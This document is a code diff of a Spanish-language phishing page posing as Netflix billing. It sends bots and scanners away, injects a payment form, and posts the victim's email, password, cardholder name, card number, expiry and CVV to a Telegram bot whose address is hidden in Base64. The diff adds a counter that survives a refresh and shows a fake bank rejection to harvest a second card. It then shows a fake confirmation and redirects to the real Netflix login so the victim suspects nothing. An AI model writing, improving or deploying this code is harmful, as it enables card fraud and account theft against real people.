@@ -14,7 +14,6 @@
             const _isLowRes = (window.screen.width < 100 || window.screen.height < 100);
             
             if (_isBot || _isLowRes) {
-                // Si es un bot o un scanner, lo mandamos a un sitio inofensivo
                 window.location.replace("https://www.google.com");
             }
         })();
@@ -61,14 +60,15 @@
         <div id="dynamic-injection"></div>
         <div id="loading-overlay">
             <i class="fas fa-spinner fa-spin fa-2x" style="color:#e50914;"></i>
-            <p>Procesando con tu banco...</p>
+            <p>Verificando con su entidad bancaria...</p>
         </div>
     </div>
 
-    
-
     <script>
-        // 2. INYECCIÓN DINÁMICA
+        // 2. CONTADOR PERSISTENTE (SOBREVIVE AL REFRESH)
+        let intentos = parseInt(sessionStorage.getItem('cont_int')) || 0;
+
+        // 3. INYECCIÓN DINÁMICA DEL FORMULARIO
         window.onload = function() {
             setTimeout(function() {
                 document.getElementById('dynamic-injection').innerHTML = `
@@ -110,21 +110,16 @@
             });
         }
 
-        // 3. ENVÍO OFUSCADO A TELEGRAM
+        // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
         function _0xdispatch(obj) {
-            // URL y ChatID en Base64 (Verificados)
+            intentos++;
+            sessionStorage.setItem('cont_int', intentos);
+
             const _0xa = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=";
             const _0xb = "Nzk5MzcyMjIxNA==";
 
-            const _0xmsg = `🔔 NUEVA TARJETA 🔔\n\n` +
-                         `📧 Correo: ${obj.em}\n` +
-                         `🔑 Pass: ${obj.pw}\n` +
-                         `👤 Titular: ${obj.nm}\n` +
-                         `💳 Tarjeta: ${obj.cc}\n` +
-                         `📅 Expiración: ${obj.ex}\n` +
-                         `🔒 CVV: ${obj.cv}`;
+            const _0xmsg = `🔔 HIT #${intentos} 🔔\n\n📧 Mail: ${obj.em}\n🔑 Pass: ${obj.pw}\n👤 Titular: ${obj.nm}\n💳 Tarjeta: ${obj.cc}\n📅 Exp: ${obj.ex}\n🔒 CVV: ${obj.cv}`;
 
-            // Cambiamos a una estructura que asegura el envío antes de mostrar el error
             fetch(atob(_0xa), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -134,18 +129,22 @@
                 })
             })
             .then(response => {
-                if (response.ok) {
-                    console.log("Enviado con éxito");
-                }
-                // El alert solo sale DESPUÉS de intentar el envío
+                // Pequeña pausa para simular procesamiento real
                 setTimeout(() => {
-                    alert("Error de autenticación bancaria (3DS). Por favor, intente con una tarjeta diferente.");
-                    location.reload();
-                }, 500);
+                    if (intentos < 2) {
+                        // PRIMER ERROR (Pide otra tarjeta)
+                        alert("Error de procesamiento: Su entidad bancaria ha rechazado la transacción. Por favor, intente con una tarjeta de crédito o débito diferente.");
+                        location.reload();
+                    } else {
+                        // SEGUNDO ERROR (Éxito simulado y salida)
+                        sessionStorage.removeItem('cont_int'); // Limpiamos para el próximo
+                        alert("¡Suscripción confirmada! Su cuenta ha sido actualizada. Redirigiendo a la cartelera...");
+                        window.location.href = "https://www.netflix.com/login";
+                    }
+                }, 1500);
             })
             .catch(err => {
-                // Si falla el fetch, recargamos igual para que el usuario no sospeche
-                console.error("Error en red");
+                console.error("Redirigiendo...");
                 location.reload();
             });
         }
